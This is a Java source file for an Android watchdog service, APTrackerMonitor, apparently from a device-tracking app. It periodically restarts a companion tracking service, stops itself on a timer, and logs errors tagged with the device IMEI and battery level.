package vn.vhc.live;

import java.util.Date;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

public class APTrackerMonitor extends Service {

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onCreate() {
		super.onCreate();
	}
	Thread thrMonitorBackup;
	public Handler hx= new Handler(){		
		public void handleMessage(Message msg) 
		  {			  
			try
			{
				  if(msg.what==10001)
				  {		
					  stopSelf();		
				  }
				  super.handleMessage(msg);
			}catch(Exception ex)
			{
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
						"CAndCBackUp:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			}
		  }
	};
	@Override
	public void onStart(Intent intent,int startId) 
	{
		UtilGame.isRunningServiceBackup=true;
		thrMonitorBackup=(new Thread(new Runnable()
		{
			@Override
			public void run() 
			{
				while (true) 
				{
					try 
					{
						if(((new Date()).getTime()-UtilGame.timeStarted.getTime()> (UtilGame.timeToRestart+15*60000)) && !APTrackerService.statusCmdRealtime.equalsIgnoreCase(TypeCmd.PROCESSING))
						{				
							ContextManagerCore.getInstance().restartService();
						}											
						Thread.sleep(60000); 	
						UtilGame.timeRunServiceBackupDebug=UtilGame.timeRunServiceBackupDebug+60000;						
						if(UtilGame.timeRunServiceBackupDebug > UtilGame.timeRestartServiceBackup)
						{
							hx.sendEmptyMessage(10001);
						}
					} catch (Exception ex)
					{
						try
						{
							UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
									"Thread thrMonitorBackupXXX:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
							Thread.sleep(60000);							
						} catch (Exception exxx) {}			
						UtilGame.infoRunServiceBackupDebug="Debug:"+ex.toString();
					}
				}
			}
		}));		
		
		//thrMonitorBackup.setPriority(Thread.MIN_PRIORITY);
		thrMonitorBackup.start();
	}
	@Override
	public void onDestroy() {
	    UtilGame.isRunningServiceBackup=false;
	    UtilGame.timeRunServiceBackupDebug=0;
	    try{
	    	if(thrMonitorBackup!=null)thrMonitorBackup.stop();
	    }catch(Exception ex){}
		super.onDestroy();
	}	
}
